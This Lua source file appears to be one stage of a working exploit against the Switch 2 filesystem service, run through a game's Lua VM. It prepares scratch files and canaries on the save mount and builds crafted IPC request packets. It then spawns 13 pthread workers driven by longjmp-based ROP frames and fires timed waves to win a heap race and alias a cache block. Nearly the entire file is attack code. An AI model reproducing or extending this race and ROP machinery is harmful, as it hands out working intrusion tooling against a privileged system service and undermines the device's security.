-- s2_race.lua — Scratch Setup, 13-Worker Pthread Wave Engine, Canary Campaign & Cache Alias
-- Target: Switch 2 (Ounce) — Seedsow Lullaby (Artemis Lua 5.1 VM)

local P  = require("s2_prim")
local FS = require("s2_fs")

local M = {}

local math_floor = math.floor
local math_ceil  = math.ceil
local math_min   = math.min
local math_max   = math.max
local math_abs   = math.abs
local str_byte   = string.byte
local str_char   = string.char
local str_sub    = string.sub
local str_rep    = string.rep
local str_format = string.format
local tbl_concat = table.concat

-- ---------------------------------------------------------------------------
-- 1. Configuration (Hybrid CivSwitchFS + Seedsow Hardware-Proven Parameters)
-- ---------------------------------------------------------------------------
function M.create_config(attempt_idx)
    local base_buckets = {0x14A0000, 0x13B0000, 0x1450000, 0x1400000, 0x1360000}
    local start_idx = ((attempt_idx or 1) - 1) % #base_buckets + 1
    local alias_offset = base_buckets[start_idx]
    local buckets = {alias_offset}
    for i = 1, #base_buckets do
        if base_buckets[i] ~= alias_offset then
            buckets[#buckets + 1] = base_buckets[i]
        end
    end
    local prefix_bytes = P.str_to_bytes(P.u64s(alias_offset) .. "AAAAAAAA\1\0")
    return {
        SLOT_SIZE                  = 0x800,
        attemptIndex               = attempt_idx or 1,
        WAVE_READ_SIZE             = 0x180000,
        DIRTY_FILE_SIZE            = 0x800000,  -- 8 MiB dirty write
        MAX_CONTROL_WAVES          = 13,
        MAX_COPY_ATTEMPTS          = 20,
        COPY_BATCHES               = 1,
        MAX_ADDRESS_CANDIDATES     = 5,
        MAX_POOL_REFINEMENT_READS  = 16,
        MAX_POOL_ANCHOR_CANDIDATES = 4,
        MAX_METADATA_ANCHOR_CHECKS = 16,
        MAX_METADATA_PAGE_PROBES   = 16,
        MAX_ROOT_LAYOUT_SCANS      = 4,
        CANARY_LENGTH              = 0x5A0,
        EXTENT_SIZE                = 0x2440,
        POSITIVE_FILL_SEGMENT      = 200,
        PINNING_ALLOCATION_BYTES   = nil,       -- Dynamically measured on Wave 1 (7440 Demo / 8224 Retail)
        HEAP_JITTER_BYTES          = 192,
        ALIAS_OFFSET               = alias_offset,
        ALIAS_BUCKETS              = buckets,
        MARKER_OFFSET              = 0x2340,    -- Dynamically scanned for "canary" in initial read
        WINDOW_MINIMUM_CACHE_HELD  = 0x2600,
        FIELD_MINIMUM_CACHE_HELD   = 0x2600,    -- Issue #3 fix for Seedsow Demo & Retail
        MONITORING_ROUNDS          = 4,
        CACHE_READ_SIZE            = 0x200000,  -- 2 MiB widened read
        CONTROL_SIZE               = 0x4000,    -- 16 KiB cache block
        ROOT_CAPTURE_SIZE          = 0x4D8000,
        ROOT_CAPTURE_BACK          = 0x500000,
        ROOT_CAPTURE_GAP           = 0x28000,
        ROOT_CAPTURE_CHUNK         = 0x28000,
        ROOT_CAPTURE_CHUNKS        = 31,
        CACHE_ALIAS_PREFIX         = prefix_bytes,
        triggerInitialDelayNs      = 2400000,
        roleDelays  = {0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000},
        guardDelays = {0, 150000},
        roleLabels  = {"commit", "bottleneck", "frag0", "frag1", "frag2", "frag3",
                       "canary", "filler0", "filler1", "release", "guard0", "guard1", "trigger"},
        throughRoles = {"commit", "frag0", "frag1", "frag2", "frag3"},
        heldRoles    = {"canary", "filler0", "filler1", "guard0", "guard1"},
        overlapRoles = {"commit", "frag0", "frag1", "frag2", "frag3",
                        "canary", "filler0", "filler1", "guard0", "guard1"},
    }
end

function M.set_alias_offset(config, new_offset)
    config.ALIAS_OFFSET = new_offset
    config.CACHE_ALIAS_PREFIX = P.str_to_bytes(P.u64s(new_offset) .. "AAAAAAAA\1\0")
end

function M.log_attempt_summary(config, hit, elapsed_ms, log_fn)
    if not log_fn then return end
    log_fn(str_format("RACE[#%d]: profile=0x%x alias=0x%x %s (%dms)",
        config.attemptIndex or 1,
        config.WAVE_READ_SIZE or 0x10000,
        config.ALIAS_OFFSET or 0,
        hit and "HIT" or "MISS",
        math_floor((elapsed_ms or 0) + 0.5)))
end

-- ---------------------------------------------------------------------------
-- 2. Setup Steps (S1–S10): Sessions, Leftover Cleanup, Scratch Tree & Frames
-- ---------------------------------------------------------------------------
function M.cleanup_leftover_scratch(fs, saved_handle, log_fn, scan_ns2_gap)
    local removed = {}
    -- 0. Remove any s2_run.log from save:/ so root directory layout matches reference
    local log_entry = fs.ipc_get_entry_type(saved_handle, "/s2_run.log")
    if log_entry.transport == 0 and log_entry.result == 0 then
        fs.ipc_delete_file(saved_handle, "/s2_run.log")
        removed[#removed + 1] = "/s2_run.log"
    end
    -- 1. Check /hole (single GetEntryType, zero directory allocation when absent)
    local hole_entry = fs.ipc_get_entry_type(saved_handle, "/hole")
    if hole_entry.transport == 0 and hole_entry.result == 0 then
        fs.ipc_file_invalidate(saved_handle, "/hole/commit_data", 0x800000)
        fs.ipc_file_invalidate(saved_handle, "/hole/big8", 0x800000)
        fs.remove_scratch_tree(saved_handle, "/hole")
        removed[#removed + 1] = "/hole"
    end
    -- 2. Only list "/" for leftover /NS2_GAP_* when save space is low (commit 0b188bd:
    -- opening IDirectory before the wave perturbs the fsp-srv heap)
    if scan_ns2_gap then
        local root_list = fs.ipc_list_directory(saved_handle, "/", 3)
        for _, entry in ipairs(root_list.entries or {}) do
            if entry.type == 0 and str_sub(entry.name, 1, 8) == "NS2_GAP_" then
                local dir_path = "/" .. entry.name
                fs.ipc_file_invalidate(saved_handle, dir_path .. "/commit_data", 0x1000000)
                fs.remove_scratch_tree(saved_handle, dir_path)
                removed[#removed + 1] = dir_path
            end
        end
    end
    if #removed > 0 then
        fs.ipc_commit(saved_handle)
        if log_fn then
            log_fn("SETUP: cleaned leftover scratch: " .. tbl_concat(removed, ", "))
        end
    end
    return removed
end

function M.setup_attempt(rt, fs, config, log_fn)
    local function log(msg) if log_fn then log_fn(msg) end end

    local root_session = fs.open_fsp_session()
    if root_session == 0 then
        return {ok = false, failureReason = "fsp-session-open-failed"}
    end

    local pkt_buf = rt.alloc_page(0x2000)
    local save_mount = rt.get_mount_handle("save")
    if not save_mount then
        rt.close_handle(root_session)
        return {ok = false, failureReason = "save-mount-unavailable"}
    end

    local saved_handle     = fs.clone_object(save_mount.handle, save_mount.objId)
    local temporary_handle = fs.clone_object(save_mount.handle, save_mount.objId)
    if saved_handle == 0 or temporary_handle == 0 then
        if saved_handle ~= 0 then rt.close_handle(saved_handle) end
        if temporary_handle ~= 0 then rt.close_handle(temporary_handle) end
        rt.close_handle(root_session)
        return {ok = false, failureReason = "save-filesystem-clone-failed"}
    end

    -- Clean any leftover /hole or /NS2_GAP_* from an interrupted prior run
    local removed_scratch = M.cleanup_leftover_scratch(fs, saved_handle, log_fn)
    if removed_scratch and #removed_scratch > 0 then
        rt.wait_ms(300)
    end

    local SCRATCH_DIR     = "/hole"
    local dirty_file_path = SCRATCH_DIR .. "/commit_data"
    local canary_path     = FS.normalized_path(SCRATCH_DIR .. "/canary", config.CANARY_LENGTH)
    local selected_dir    = SCRATCH_DIR .. "/selected"
    local salt            = tostring(math_floor(rt.get_tick() % 1000000000))
    local segments        = {"S0_" .. salt, "S1_" .. salt, "S2_" .. salt}
    local marker_path     = SCRATCH_DIR .. "/" .. segments[1] .. "/" .. segments[2] .. "/" .. segments[3] .. "/SPAN_MARKER"

    local storage_handle, trigger_handle, extent_trigger_handle, aux_storage_handle = 0, 0, 0, 0
    local save_clones, root_clones = {}, {}
    local function fail_setup(reason, has_scratch)
        if has_scratch then
            fs.ipc_file_invalidate(saved_handle, dirty_file_path, config.DIRTY_FILE_SIZE)
            fs.remove_scratch_tree(saved_handle, SCRATCH_DIR)
        end
        for _, h in ipairs(save_clones) do rt.close_handle(h) end
        for _, h in ipairs(root_clones) do rt.close_handle(h) end
        rt.close_handle(trigger_handle)
        rt.close_handle(extent_trigger_handle)
        rt.close_handle(aux_storage_handle)
        rt.close_handle(storage_handle)
        rt.close_handle(saved_handle)
        rt.close_handle(temporary_handle)
        rt.close_handle(root_session)
        return {ok = false, failureReason = reason}
    end

    local space_before = fs.ipc_free_space(saved_handle, "/")
    if space_before.error ~= 0 or space_before.bytes <= (config.DIRTY_FILE_SIZE + 0x410000) then
        M.cleanup_leftover_scratch(fs, saved_handle, log_fn, true)
        space_before = fs.ipc_free_space(saved_handle, "/")
        if space_before.error ~= 0 or space_before.bytes <= (config.DIRTY_FILE_SIZE + 0x410000) then
            return fail_setup("insufficient-save-free-space", false)
        end
    end

    if fs.ipc_create_directory(saved_handle, SCRATCH_DIR) ~= 0 or fs.ipc_commit(saved_handle) ~= 0 then
        return fail_setup("scratch-root-create-failed", true)
    end

    if fs.ipc_create_file(saved_handle, dirty_file_path, config.DIRTY_FILE_SIZE) ~= 0 then
        return fail_setup("dirty-file-create-failed", true)
    end

    -- Create nested canary parent directories + 1-byte canary file
    local parts = {}
    for seg in canary_path:sub(2):gmatch("[^/]+") do
        parts[#parts + 1] = seg
    end
    for i = 2, #parts - 1 do
        local sub_dir = "/" .. tbl_concat(parts, "/", 1, i)
        local rc = fs.ipc_create_directory(saved_handle, sub_dir)
        if rc ~= 0 and (rc % 0x400000) ~= 0x402 then
            return fail_setup("canary-mkdir-failed", true)
        end
    end
    if fs.ipc_create_file(saved_handle, canary_path, 1) ~= 0 then
        return fail_setup("canary-file-create-failed", true)
    end

    -- Measure empty-path abort control result
    local abort_ctrl = fs.ipc_get_entry_type(saved_handle, "", 1)
    local abort_control_canonical = (abort_ctrl.result or 0x202) % 0x400000

    if fs.ipc_create_directory(saved_handle, selected_dir) ~= 0 then
        return fail_setup("selected-dir-create-failed", true)
    end

    local running = SCRATCH_DIR
    for i = 1, #segments do
        running = running .. "/" .. segments[i]
        if fs.ipc_create_directory(temporary_handle, running) ~= 0 then
            return fail_setup("span-dir-create-failed", true)
        end
    end
    if fs.ipc_create_file(temporary_handle, marker_path, 1) ~= 0 then
        return fail_setup("span-marker-create-failed", true)
    end

    -- Open primary IStorage + clones
    local storage_before = fs.read_allocation_counters(root_session, pkt_buf)
    storage_handle = fs.open_content_storage(root_session)
    local storage_after  = fs.read_allocation_counters(root_session, pkt_buf)
    if storage_handle == 0 then
        return fail_setup("primary-storage-open-failed", true)
    end
    local storage_open_cost = (storage_before and storage_after) and (storage_before[6] - storage_after[6]) or nil
    if storage_open_cost and storage_open_cost >= 0x400 and storage_open_cost <= 0x40000 then
        config.MEASURED_STORAGE_COST = storage_open_cost
    end

    local sz_info = fs.ipc_storage_get_size(storage_handle)
    config.STORAGE_SIZE = sz_info.size
    -- Do NOT read from storage_handle before Wave 1 (commit 0b188bd &CivSwitchFS setup.mjs):
    -- pre-wave storage reads warm the cache block and perturb the fsp-srv heap, stopping the canary flip.
    if _G.S2_MARKER_OFFSET then
        config.MARKER_OFFSET = _G.S2_MARKER_OFFSET
    end

    for i = 1, 6 do
        local h = fs.clone_fs_session(saved_handle)
        if h == 0 then return fail_setup("save-clone-failed-" .. i, true) end
        save_clones[i] = h
    end
    for i = 1, 4 do
        local h = fs.clone_fs_session(root_session)
        if h == 0 then return fail_setup("root-clone-failed-" .. i, true) end
        root_clones[i] = h
    end
    trigger_handle        = fs.clone_fs_session(saved_handle)
    extent_trigger_handle = fs.clone_fs_session(temporary_handle)
    aux_storage_handle    = fs.open_content_storage(root_session)
    if trigger_handle == 0 or extent_trigger_handle == 0 or aux_storage_handle == 0 then
        return fail_setup("trigger-or-aux-open-failed", true)
    end

    -- Allocate packet & path buffers
    local extent_total  = config.EXTENT_SIZE + 1
    local trigger_buf   = rt.alloc_page(0x2000)
    local fragment_bufs = {}
    for i = 1, 4 do fragment_bufs[i] = rt.alloc_page(0x2000) end

    local canary_buf_mem = rt.alloc_page(0x1000)
    rt.wr_str(canary_buf_mem, canary_path)

    local guard_path   = FS.normalized_path(SCRATCH_DIR .. "/absent", 0x300)
    local guard_path_c = str_sub(guard_path, 1, #guard_path - 1) .. "C"
    local guard_buf0   = rt.alloc_page(0x1000)
    local guard_buf1   = rt.alloc_page(0x1000)
    rt.wr_str(guard_buf0, guard_path)
    rt.wr_str(guard_buf1, guard_path_c)

    local filler_src  = "/NS2_SRC00000000"
    local filler_dst  = FS.normalized_path(SCRATCH_DIR .. "/page_absent", 0x7EF)
    local filler_buf0 = rt.alloc_page(0x1000)
    local filler_buf1 = rt.alloc_page(0x1000)
    rt.wr_str(filler_buf0, filler_src)
    rt.wr_str(filler_buf1, filler_dst)

    -- Path-pair control check (RenameFile cmd 5 must return 0x202)
    local fc_rc, fc_tx = fs.ipc_rename_file(saved_handle, filler_src, filler_dst, 16, 0x7F0)
    local gc_rc, gc_tx = fs.ipc_rename_file(saved_handle, guard_path, guard_path_c, 0x301, 0x301)
    if fc_tx ~= 0 or (fc_rc % 0x400000) ~= 0x202 or gc_tx ~= 0 or (gc_rc % 0x400000) ~= 0x202 then
        return fail_setup("path-pair-control-failed", true)
    end

    -- Build 13 request packet pages (REQ[1..13] for roles 0..12)
    local REQ = {}
    for i = 1, 13 do REQ[i] = rt.alloc_page(0x2000) end
    local bottleneck_recv = rt.alloc_page(config.WAVE_READ_SIZE + 0x2000)

    local req_strs = {}
    -- Role 0 (REQ[1]): Commit (cmd 10, ctx 3)
    req_strs[1] = P.apply_context(P.packet(10, ""), 3)
    -- Role 1 (REQ[2]): IStorage::Read (cmd 0, B descriptor, ctx 9)
    req_strs[2] = P.apply_context(P.packet(0, P.u64s(0) .. P.u64s(config.WAVE_READ_SIZE), {
        b = {{addr = bottleneck_recv, size = config.WAVE_READ_SIZE, mode = 1}}
    }), 9)
    -- Roles 2..5 (REQ[3..6]): fragment cmd 1002, ctx 3
    for i = 1, 4 do
        req_strs[2 + i] = P.apply_context(P.packet(1002, "", {
            x = {{addr = fragment_bufs[i], size = config.SLOT_SIZE}}
        }), 3)
    end
    -- Role 6 (REQ[7]): canary GetEntryType (cmd 7, ctx 9)
    req_strs[7] = P.apply_context(P.packet(7, "", {
        x = {{addr = canary_buf_mem, size = #canary_path + 1}}
    }), 9)
    -- Roles 7..8 (REQ[8..9]): filler RenameFile (cmd 5, ctx 9)
    for idx = 8, 9 do
        req_strs[idx] = P.apply_context(P.packet(5, "", {
            x = {
                {addr = filler_buf0, size = 16, index = 0},
                {addr = filler_buf1, size = 0x7F0, index = 1}
            }
        }), 9)
    end
    -- Role 9 (REQ[10]): CloseObject (domain close)
    req_strs[10] = P.domain_close_object(1)
    -- Roles 10..11 (REQ[11..12]): guard RenameFile (cmd 5, ctx 9)
    for idx = 11, 12 do
        req_strs[idx] = P.apply_context(P.packet(5, "", {
            x = {
                {addr = guard_buf0, size = 0x301, index = 0},
                {addr = guard_buf1, size = 0x301, index = 1}
            }
        }), 9)
    end
    -- Role 12 (REQ[13]): trigger GetEntryType (cmd 7, ctx 9)
    req_strs[13] = P.apply_context(P.packet(7, "", {
        x = {{addr = trigger_buf, size = config.SLOT_SIZE}}
    }), 9)

    for i = 1, 13 do rt.wr(REQ[i], req_strs[i]) end

    local pin_pkt   = rt.alloc_page(0x2000)
    local clear_pkt = rt.alloc_page(0x2000)
    local pre_pkt   = rt.alloc_page(0x2000)
    local pin_str_200  = P.apply_context(P.packet(200, ""), 9)
    local pin_str_1009 = P.apply_context(P.packet(1009, ""), 9)
    rt.wr(pin_pkt, pin_str_200)
    rt.wr(clear_pkt, pin_str_1009)
    rt.wr(pre_pkt, pin_str_1009)

    -- Gate & synchronization block
    local gate_block = rt.alloc_page(0x4000)
    local gates = {
        block              = gate_block,
        masterGate         = gate_block + 0x000,
        bottleneckDoneGate = gate_block + 0x100,
        groupReleasedGate  = gate_block + 0x200,
        guardLaunchedGate  = gate_block + 0x300,
        bottleneckFinished = gate_block + 0x400,
        completedFlag      = gate_block + 0x500,
        earlyHole          = gate_block + 0x600,
        sampledCompleted   = gate_block + 0x700,
        sampledEarlyHole   = gate_block + 0x800,
        zeroByte           = gate_block + 0x900,
        spacingDecision    = gate_block + 0xA00,
        roleDoneFlags      = gate_block + 0xB00,
        groupSessionSlot   = gate_block + 0xC00,
        triggerHandleSlot  = gate_block + 0xC08,
        pthreadSlots       = gate_block + 0x1000, -- 13 * 16 bytes
    }

    -- Build 13 worker plans & frames
    local wave_data = M.build_wave_infrastructure(rt, config, REQ, pin_pkt, clear_pkt, pre_pkt,
        save_clones, root_clones, storage_handle, root_session, trigger_buf, gates)

    log("SETUP: scratch tree & 13 pthread workers ready")
    return {
        ok                    = true,
        pktBuf                = pkt_buf,
        SCRATCH_DIR           = SCRATCH_DIR,
        dirtyFilePath         = dirty_file_path,
        canaryPath            = canary_path,
        selectedDir           = selected_dir,
        segments              = segments,
        abortControlCanonical = abort_control_canonical,
        extentTotal           = extent_total,
        triggerBuf            = trigger_buf,
        fragmentBufs          = fragment_bufs,
        REQ                   = REQ,
        reqStrs               = req_strs,
        pinPkt                = pin_pkt,
        clearPkt              = clear_pkt,
        prePkt                = pre_pkt,
        pinStr200             = pin_str_200,
        pinStr1009            = pin_str_1009,
        gates                 = gates,
        waveData              = wave_data,
        handles = {
            rootSession            = root_session,
            savedHandle            = saved_handle,
            temporaryHandle        = temporary_handle,
            storageHandle          = storage_handle,
            auxiliaryStorageHandle = aux_storage_handle,
            saveClones             = save_clones,
            rootClones             = root_clones,
            triggerHandle          = trigger_handle,
            extentTriggerHandle    = extent_trigger_handle,
            pinHandle              = 0,
            candidateHandle        = 0,
            extraStorages          = {},
        }
    }
end

-- ---------------------------------------------------------------------------
-- 3. 13-Worker Pthread + `longjmp` ROP Wave Infrastructure
-- ---------------------------------------------------------------------------
function M.build_wave_infrastructure(rt, config, REQ, pin_pkt, clear_pkt, pre_pkt,
    save_clones, root_clones, storage_handle, root_session, trigger_buf, gates)

    local SDK = rt.SDK
    local O   = P.OFFSETS.SDK
    local EVENT_WAIT   = SDK + O.EVENT_WAIT
    local EVENT_SIGNAL = SDK + O.EVENT_SIGNAL
    local SLEEP_SVC    = SDK + O.SVC_SLEEP_THREAD
    local TICK         = SDK + O.OS_TICK
    local SEND_USER    = SDK + O.SVC_SEND_SYNC_USER
    local MEMCPY       = SDK + O.MEMCPY
    local MEMSET       = SDK + O.MEMSET

    local function WAIT(g)     return {fn = EVENT_WAIT,   args = {g, 0, 0, 0}} end
    local function SIGNAL(g)   return {fn = EVENT_SIGNAL, args = {g, 0, 0, 0}} end
    local function SLEEP(ns)
        local scaled = math_floor((ns or 0) * rt.sleep_scale + 0.5)
        return {fn = SLEEP_SVC, args = {scaled, 0, 0, 0}}
    end
    local function TICK_CALL() return {fn = TICK,         args = {0, 0, 0, 0}} end
    local function SEND(pkt, h)
        return {fn = SEND_USER, args = {pkt, 0x1000, h, 0}, is_send = true, pkt = pkt}
    end
    local function SETB(dst, v) return {fn = MEMSET,      args = {dst, v, 1, 0}} end
    local function MCPY(dst, src, len) return {fn = MEMCPY, args = {dst, src, len, 0}} end

    local role_handles = {
        save_clones[1],                -- 0: commit
        storage_handle,                -- 1: bottleneck
        root_clones[1],                -- 2: frag0
        root_clones[2],                -- 3: frag1
        root_clones[3],                -- 4: frag2
        root_clones[4],                -- 5: frag3
        save_clones[2],                -- 6: canary
        save_clones[3],                -- 7: filler0
        save_clones[4],                -- 8: filler1
        {u32 = gates.groupSessionSlot},-- 9: release (dynamic u32 from groupSessionSlot)
        save_clones[5],                -- 10: guard0
        save_clones[6],                -- 11: guard1
        {u32 = gates.triggerHandleSlot}-- 12: trigger (dynamic u32 from triggerHandleSlot)
    }

    local plans = {}
    local send_logical_idx = {}
    local pin_logical_idx, clear_logical_idx, pre_logical_idx = -1, -1, -1

    for i = 0, 12 do
        local steps = {WAIT(gates.masterGate)}
        if i < 10 then
            steps[#steps + 1] = SLEEP(config.roleDelays[i + 1])
        elseif i < 12 then
            steps[#steps + 1] = WAIT(gates.groupReleasedGate)
            steps[#steps + 1] = SLEEP(config.guardDelays[i - 9])
        else
            -- Role 12 (trigger)
            steps[#steps + 1] = SLEEP(config.triggerInitialDelayNs or 2400000)
            steps[#steps + 1] = WAIT(gates.groupReleasedGate)
            steps[#steps + 1] = WAIT(gates.guardLaunchedGate)
            steps[#steps + 1] = SLEEP(400000)
            steps[#steps + 1] = MCPY(gates.spacingDecision, gates.bottleneckFinished, 4)
            steps[#steps + 1] = WAIT(gates.bottleneckDoneGate)
            steps[#steps + 1] = MCPY(gates.sampledCompleted, gates.completedFlag, 4)
            steps[#steps + 1] = MCPY(gates.sampledEarlyHole, gates.earlyHole, 4)
            -- Dynamic 1-byte zero copy if any guard flag is non-zero
            steps[#steps + 1] = MCPY(trigger_buf, gates.zeroByte, {u32 = gates.sampledCompleted})
            steps[#steps + 1] = MCPY(trigger_buf, gates.zeroByte, {u32 = gates.sampledEarlyHole})
            steps[#steps + 1] = MCPY(trigger_buf, gates.zeroByte, {u32 = gates.spacingDecision})
        end

        if i == 9 then
            steps[#steps + 1] = TICK_CALL()
            pin_logical_idx = #steps -- 0-based logical index
            steps[#steps + 1] = SEND(pin_pkt, root_session)
            steps[#steps + 1] = TICK_CALL()

            steps[#steps + 1] = TICK_CALL()
            clear_logical_idx = #steps
            steps[#steps + 1] = SEND(clear_pkt, root_session)
            steps[#steps + 1] = TICK_CALL()

            steps[#steps + 1] = TICK_CALL()
            pre_logical_idx = #steps
            steps[#steps + 1] = SEND(pre_pkt, root_session)
            steps[#steps + 1] = TICK_CALL()
        end

        if i == 11 then
            steps[#steps + 1] = MCPY(gates.earlyHole, gates.bottleneckFinished, 4)
            steps[#steps + 1] = SIGNAL(gates.guardLaunchedGate)
        end

        steps[#steps + 1] = TICK_CALL()
        send_logical_idx[i + 1] = #steps -- 0-based logical index of role's main SEND
        steps[#steps + 1] = SEND(REQ[i + 1], role_handles[i + 1])
        steps[#steps + 1] = TICK_CALL()

        if i == 1 then
            steps[#steps + 1] = SETB(gates.bottleneckFinished, 1)
            steps[#steps + 1] = SIGNAL(gates.bottleneckDoneGate)
        end
        if i == 9 then
            steps[#steps + 1] = SIGNAL(gates.groupReleasedGate)
        end
        if i == 0 or (i >= 2 and i <= 8) or i == 10 or i == 11 then
            steps[#steps + 1] = SETB(gates.completedFlag, 1)
            steps[#steps + 1] = SETB(gates.roleDoneFlags + i, 1)
        end
        plans[i + 1] = steps
    end

    -- Allocate 13 worker frame arenas (0x10000 each) + 13 snapshot arenas
    local FRAME_LIMIT = 0x10000
    local frames_arena = rt.alloc_page(26 * FRAME_LIMIT)
    local workers = {}
    for i = 1, 13 do
        local base = frames_arena + (i - 1) * FRAME_LIMIT
        local snap = frames_arena + (13 + i - 1) * FRAME_LIMIT
        local slot = gates.pthreadSlots + (i - 1) * 16
        local built = rt.write_worker_frame(base, FRAME_LIMIT, plans[i], snap)
        workers[i] = {
            index    = i,
            base     = base,
            limit    = FRAME_LIMIT,
            snapshot = snap,
            slot     = slot,
            plans    = plans[i],
            proof    = built.proof,
            send_li  = send_logical_idx[i],
        }
    end

    return {
        workers           = workers,
        plans             = plans,
        sendLogicalIdx    = send_logical_idx,
        pinLogicalIdx     = pin_logical_idx,
        clearLogicalIdx   = clear_logical_idx,
        preLogicalIdx     = pre_logical_idx,
        roleHandles       = role_handles,
        framesArena       = frames_arena,
        frameLimit        = FRAME_LIMIT,
    }
end

-- Initialize/clear the 4 LightEventType gates before a wave
function M.reset_gates(rt, gates)
    local SDK = rt.SDK
    local INIT = SDK + P.OFFSETS.SDK.EVENT_INIT
    rt.memset(gates.block, 0, 0x1000)
    for _, g in ipairs({gates.masterGate, gates.bottleneckDoneGate, gates.groupReleasedGate, gates.guardLaunchedGate}) do
        rt.N.call_deep(INIT, g, 0, 0, 0, 0)
    end
end

-- Reset packets, gates, and worker frames from RAM snapshots
function M.reset_wave_state(rt, setup)
    M.reset_gates(rt, setup.gates)
    for i = 1, 13 do
        rt.memset(setup.REQ[i], 0, 0x200)
        rt.wr(setup.REQ[i], setup.reqStrs[i])
    end
    rt.memset(setup.clearPkt, 0, 0x200)
    rt.wr(setup.clearPkt, setup.pinStr1009)
    rt.memset(setup.prePkt, 0, 0x200)
    rt.wr(setup.prePkt, setup.pinStr1009)

    local workers = setup.waveData.workers
    for i = 1, 13 do
        local w = workers[i]
        rt.memcpy(w.base, w.snapshot, w.proof.bytes)
    end
end

-- Read a logical call's 64-bit result from a worker frame (returns nil if SENTINEL)
function M.read_logical_result(rt, worker, logical_idx0)
    local native_idx0 = worker.proof.logicalResultIndices[logical_idx0 + 1]
    if not native_idx0 then return nil end
    local cell_addr = worker.base + worker.proof.resultsOffset + native_idx0 * 8
    local raw8 = rt.rd(cell_addr, 8)
    if raw8 == P.SENTINEL_BYTES then return nil end
    return P.u64(raw8, 0)
end

-- Execute one 13-worker wave locally in Lua (zero network traffic)
function M.execute_wave(rt, setup)
    local N              = rt.N
    local SDK            = rt.SDK
    local PTHREAD_CREATE = SDK + P.OFFSETS.SDK.PTHREAD_CREATE
    local PTHREAD_JOIN   = SDK + P.OFFSETS.SDK.PTHREAD_JOIN
    local LONGJMP        = SDK + P.OFFSETS.SDK.LONGJMP
    local EVENT_SIGNAL   = SDK + P.OFFSETS.SDK.EVENT_SIGNAL
    local workers        = setup.waveData.workers
    local gates          = setup.gates

    local created = 0
    for i = 1, 13 do
        local w = workers[i]
        rt.wr(w.slot, P.ZERO8 .. P.ZERO8)
        local rc = P.signed_ret(N.call_deep(PTHREAD_CREATE, w.slot, 0, LONGJMP, w.base, 0))
        local th = rt.rd_u64(w.slot)
        if rc == 0 and th > 0 and th < 281474976710656 then
            w.thread = th
            w.joined = false
            created = created + 1
        else
            w.thread = 0
            w.joined = true
            break
        end
    end

    if created < 13 then
        -- Unblock any created workers and join them cleanly
        N.call_deep(EVENT_SIGNAL, gates.masterGate, 0, 0, 0, 0)
        N.call_deep(EVENT_SIGNAL, gates.groupReleasedGate, 0, 0, 0, 0)
        N.call_deep(EVENT_SIGNAL, gates.guardLaunchedGate, 0, 0, 0, 0)
        N.call_deep(EVENT_SIGNAL, gates.bottleneckDoneGate, 0, 0, 0, 0)
        local safe = true
        for i = 1, created do
            local w = workers[i]
            if w.thread ~= 0 then
                local jrc = P.signed_ret(N.call_deep(PTHREAD_JOIN, w.thread, w.slot + 8, 0, 0, 0))
                if jrc == 0 then w.joined = true else safe = false end
            end
        end
        return {created = created, started = created, done = 0, joined = 0, workerStateSafe = safe}
    end

    -- Let all 13 pthreads park on masterGate (20 ms settle)
    rt.sleep_ns(20000000)
    local signal_rc = P.u32_norm(N.call_deep(EVENT_SIGNAL, gates.masterGate, 0, 0, 0, 0))
    -- Keep main thread asleep for 30 ms while the 13 workers run the 0..4 ms window
    rt.sleep_ns(30000000)
    local deadline = rt.now_ms() + 25000

    local done = 0
    while true do
        done = 0
        for i = 1, 13 do
            local w = workers[i]
            local post_tick = M.read_logical_result(rt, w, w.send_li + 1)
            if post_tick ~= nil then done = done + 1 end
        end
        if done == 13 or rt.now_ms() >= deadline then break end
        rt.sleep_ns(1000000)
    end

    local joined = 0
    local safe = true
    for i = 1, 13 do
        local w = workers[i]
        -- Wait for final cell of worker i before blocking in pthread_join
        local cell_deadline = rt.now_ms() + 10000
        local last_off = w.proof.resultOffset
        while rt.rd(w.base + last_off, 8) == P.SENTINEL_BYTES and rt.now_ms() < cell_deadline do
            rt.sleep_ns(1000000)
        end
        if rt.rd(w.base + last_off, 8) ~= P.SENTINEL_BYTES then
            local jrc = P.signed_ret(N.call_deep(PTHREAD_JOIN, w.thread, w.slot + 8, 0, 0, 0))
            if jrc == 0 then
                w.joined = true
                joined = joined + 1
            else
                safe = false
            end
        else
            safe = false
        end
    end

    return {
        created         = 13,
        started         = 13,
        done            = done,
        joined          = joined,
        workerStateSafe = safe,
        signalResult    = signal_rc
    }
end

-- ---------------------------------------------------------------------------
-- 4. Payload & Profile Configuration, Wave Analysis, Campaign & Alias
-- ---------------------------------------------------------------------------
require("s2_wave").attach(M)

return M
